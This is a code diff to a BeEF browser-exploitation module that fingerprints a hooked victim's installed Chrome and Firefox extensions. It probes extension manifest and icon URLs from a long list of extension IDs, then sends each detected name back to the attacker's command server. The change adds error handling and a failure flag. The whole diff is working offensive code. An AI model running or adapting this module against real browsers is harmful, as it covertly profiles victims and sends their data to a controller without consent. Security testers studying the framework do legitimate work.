@@ -1009,101 +1009,132 @@ beef.execute(function() {
 		new Array("inolmjbojghkehmmlbdmpdlmagalddni","Jagran - India No.1 Hindi News Daily")
 	);
 
-        var firefox_extensions = {
-                "Adblock Plus" : "chrome://adblockplus/skin/adblockplus.png",
-                "Auto Copy" : "chrome://autocopy/skin/autocopy.png",
-                "ColorZilla" : "chrome://colorzilla/skin/logo.png",
-                "Customize Google" : "chrome://customizegoogle/skin/32x32.png",
-                "DownThemAll!" : "chrome://dta/content/immagini/icon.png",
-                "Faster Fox" : "chrome://fasterfox/skin/icon.png",
-                "Flash Block" : "chrome://flashblock/skin/flash-on-24.png",
-                "FlashGot" : "chrome://flashgot/skin/icon32.png",
-                "Forecastfox" : "chrome://forecastfox/skin/images/icon.png",
-                "Google Toolbar" : "chrome://google-toolbar/skin/icon.png",
-                "Greasemonkey" : "chrome://greasemonkey/content/status_on.gif",
-                "IE Tab" : "chrome://ietab/skin/ietab-button-ie16.png",
-                "IE View" : "chrome://ieview/skin/ieview-icon.png",
-                "JS View" : "chrome://jsview/skin/jsview.gif",
-                "Live HTTP Headers" : "chrome://livehttpheaders/skin/img/Logo.png",
-                "MeasureIt" : "chrome://measureit/skin/measureit.png",
-                "SEO For Firefox" : "chrome://seo4firefox/content/icon32.png",
-                "SEOpen" : "chrome://seopen/skin/seopen.png",
-                "Search Status" : "chrome://searchstatus/skin/cax10.png",
-                "Server Switcher" : "chrome://switcher/skin/icon.png",
-                "StumbleUpon" : "chrome://stumbleupon/content/skin/logo32.png",
-                "Tab Mix Plus" : "chrome://tabmixplus/skin/tmp.png",
-                "Torrent-Search Toolbar" : "chrome://torrent-search/skin/v.png",
-                "User Agent Switcher" : "chrome://useragentswitcher/content/logo.png",
-                "View Source With" : "chrome://viewsourcewith/skin/ff/tb16.png",
-                "Web Developer" : "chrome://webdeveloper/content/images/logo.png",
-                "Unhide Passwords" : "chrome://unhidepw/skin/unhidepw.png",
-                "UrlParams" : "chrome://urlparams/skin/urlparams32.png",
-                "NewsFox" : "chrome://newsfox/skin/images/home.png",
-                "Add N Edit Cookies" : "chrome://addneditcookies/skin/images/anec32.png",
-                "GTDGmail" : "chrome://gtdgmail/content/gtd_lineitem.png",
-                "QuickJava" : "chrome://quickjava/content/js.png",
-                "Adblock Filterset.G Updater" : "chrome://unplug/skin/unplug.png",
-                "BBCode" : "chrome://bbcode/skin/bbcode.png",
-                "BugMeNot" : "chrome://bugmenot/skin/bugmenot.png",
-                "ConQuery" : "chrome://conquery/skin/conquery.png",
-                "Download Manager Tweak" : "chrome://downloadmgr/skin/downloadIcon.png",
-                "Extended Cookie Manager" : "chrome://xcm/content/allowed.png",
-                "FireBug" : "chrome://firebug/content/firebug32.png",
-                "FoxyTunes" : "chrome://foxytunes/skin/logo.png",
-                "MR Tech Disable XPI Install Delay" : "chrome://disable_xpi_delay/content/icon.png",
-                "SessionSaver .2" : "chrome://sessionsaver/content/ss.png",
-                "spooFX" : "chrome://spoofx/skin/main/spoofx.png",
-                "Statusbar Clock" : "chrome://timestatus/skin/icon.png",
-                "Torbutton" : "chrome://torbutton/skin/bigbutton_gr.png",
-                "UnPlug" : "chrome://unplug/skin/unplug.png",
-                "View Source Chart" : "chrome://vrs/skin/vrssmall.png",
-                "XPather" : "chrome://xpather/content/iconka.png",
-                "WOT" : "chrome://wot/skin/fusion/logo.png",
-                "LastPass" : "chrome://lastpass/skin/vaultdelete.png",
+    var firefox_extensions = {
+            "Adblock Plus" : "chrome://adblockplus/skin/adblockplus.png",
+            "Auto Copy" : "chrome://autocopy/skin/autocopy.png",
+            "ColorZilla" : "chrome://colorzilla/skin/logo.png",
+            "Customize Google" : "chrome://customizegoogle/skin/32x32.png",
+            "DownThemAll!" : "chrome://dta/content/immagini/icon.png",
+            "Faster Fox" : "chrome://fasterfox/skin/icon.png",
+            "Flash Block" : "chrome://flashblock/skin/flash-on-24.png",
+            "FlashGot" : "chrome://flashgot/skin/icon32.png",
+            "Forecastfox" : "chrome://forecastfox/skin/images/icon.png",
+            "Google Toolbar" : "chrome://google-toolbar/skin/icon.png",
+            "Greasemonkey" : "chrome://greasemonkey/content/status_on.gif",
+            "IE Tab" : "chrome://ietab/skin/ietab-button-ie16.png",
+            "IE View" : "chrome://ieview/skin/ieview-icon.png",
+            "JS View" : "chrome://jsview/skin/jsview.gif",
+            "Live HTTP Headers" : "chrome://livehttpheaders/skin/img/Logo.png",
+            "MeasureIt" : "chrome://measureit/skin/measureit.png",
+            "SEO For Firefox" : "chrome://seo4firefox/content/icon32.png",
+            "SEOpen" : "chrome://seopen/skin/seopen.png",
+            "Search Status" : "chrome://searchstatus/skin/cax10.png",
+            "Server Switcher" : "chrome://switcher/skin/icon.png",
+            "StumbleUpon" : "chrome://stumbleupon/content/skin/logo32.png",
+            "Tab Mix Plus" : "chrome://tabmixplus/skin/tmp.png",
+            "Torrent-Search Toolbar" : "chrome://torrent-search/skin/v.png",
+            "User Agent Switcher" : "chrome://useragentswitcher/content/logo.png",
+            "View Source With" : "chrome://viewsourcewith/skin/ff/tb16.png",
+            "Web Developer" : "chrome://webdeveloper/content/images/logo.png",
+            "Unhide Passwords" : "chrome://unhidepw/skin/unhidepw.png",
+            "UrlParams" : "chrome://urlparams/skin/urlparams32.png",
+            "NewsFox" : "chrome://newsfox/skin/images/home.png",
+            "Add N Edit Cookies" : "chrome://addneditcookies/skin/images/anec32.png",
+            "GTDGmail" : "chrome://gtdgmail/content/gtd_lineitem.png",
+            "QuickJava" : "chrome://quickjava/content/js.png",
+            "Adblock Filterset.G Updater" : "chrome://unplug/skin/unplug.png",
+            "BBCode" : "chrome://bbcode/skin/bbcode.png",
+            "BugMeNot" : "chrome://bugmenot/skin/bugmenot.png",
+            "ConQuery" : "chrome://conquery/skin/conquery.png",
+            "Download Manager Tweak" : "chrome://downloadmgr/skin/downloadIcon.png",
+            "Extended Cookie Manager" : "chrome://xcm/content/allowed.png",
+            "FireBug" : "chrome://firebug/content/firebug32.png",
+            "FoxyTunes" : "chrome://foxytunes/skin/logo.png",
+            "MR Tech Disable XPI Install Delay" : "chrome://disable_xpi_delay/content/icon.png",
+            "SessionSaver .2" : "chrome://sessionsaver/content/ss.png",
+            "spooFX" : "chrome://spoofx/skin/main/spoofx.png",
+            "Statusbar Clock" : "chrome://timestatus/skin/icon.png",
+            "Torbutton" : "chrome://torbutton/skin/bigbutton_gr.png",
+            "UnPlug" : "chrome://unplug/skin/unplug.png",
+            "View Source Chart" : "chrome://vrs/skin/vrssmall.png",
+            "XPather" : "chrome://xpather/content/iconka.png",
+            "WOT" : "chrome://wot/skin/fusion/logo.png",
+            "LastPass" : "chrome://lastpass/skin/vaultdelete.png",
+    };
 
-        };
-
+	var failed = false;
 	var detect_chrome_extension = function(addon_id, addon_name) {
+		if (failed) {
+			return false;
+		}
+
 		var s = document.createElement('script');
 		s.onload = function() {
 			beef.net.send('<%= @command_url %>', <%= @command_id %>, 'extension='+addon_name);
+		}
+		s.onerror = function() {
+			throw 'detect_chrome_extension';
 		}
 		s.src = 'chrome-extension://' + addon_id + '/manifest.json';
 		document.body.appendChild(s);
 	}
 
-        var detect_firefox_extension = function(addon_url, addon_name) {
-                var img = document.createElement("img");
-                img.setAttribute("border", '0');
-                img.setAttribute("width", '0');
-                img.setAttribute("height", '0');
-                img.setAttribute("onload", "beef.net.send('<%= @command_url %>', <%= @command_id %>, 'extension=" + addon_name+ "');");
-                img.setAttribute("src", addon_url);
-        }
+    var detect_firefox_extension = function(addon_url, addon_name) {
+		if (failed) {
+			return false;
+		}
+        var img = document.createElement("img");
+        img.setAttribute("border", '0');
+        img.setAttribute("width", '0');
+        img.setAttribute("height", '0');
+        img.setAttribute("onload", "beef.net.send('<%= @command_url %>', <%= @command_id %>, 'extension=" + addon_name+ "');");
+        img.setAttribute('onerror', 'throw "detect_firefox_extension"');
+        img.setAttribute("src", addon_url);
+    }
 
-        if(beef.browser.isC()) {
-                try {
-                        for (var i=0; i<chrome_extensions.length; i++) {
-                                detect_chrome_extension(chrome_extensions[i][0], chrome_extensions[i][1]);
-                        }
-                } catch(e) {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Chrome extensions failed', beef.are.status_error());
-                }
-        } else if(beef.browser.isFF()) {
-                try {
-                        for (var i in firefox_extensions) {
-                                detect_firefox_extension(firefox_extensions[i], i);
-                        }
-                } catch(e) {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Firefox extensions failed', beef.are.status_error());
-                }
-        } else if(beef.browser.isIE()) {
-                try {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions is not supported', beef.are.status_error());
-                } catch(e) {
-                        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions failed', beef.are.status_error());
-                }
+    if(beef.browser.isC()) {
+        try {
+
+        	window.onerror = function (e) {
+				if (!failed) {
+					failed = true;
+					if (e.indexOf("detect_chrome_extension") != -1) {
+						beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Chrome extensions failed', beef.are.status_error());
+					}
+				}
+			};
+
+            for (var i=0; i<chrome_extensions.length; i++) {
+                detect_chrome_extension(chrome_extensions[i][0], chrome_extensions[i][1]);
+            }
+        } catch(e) {
+            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Chrome extensions failed', beef.are.status_error());
         }
+    } else if(beef.browser.isFF()) {
+        try {
+
+			window.onerror = function (e) {
+				if (!failed) {
+					failed = true;
+					if (e.indexOf("detect_firefox_extension") != -1) {
+						beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Firefox extensions failed', beef.are.status_error());
+					}
+				}
+			};
+
+            for (var i in firefox_extensions) {
+                detect_firefox_extension(firefox_extensions[i], i);
+            }
+        } catch(e) {
+            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Firefox extensions failed', beef.are.status_error());
+        }
+    } else if(beef.browser.isIE()) {
+        try {
+            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions is not supported', beef.are.status_error());
+        } catch(e) {
+            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=detecting Internet Explorer extensions failed', beef.are.status_error());
+        }
+    }
 
 });
 
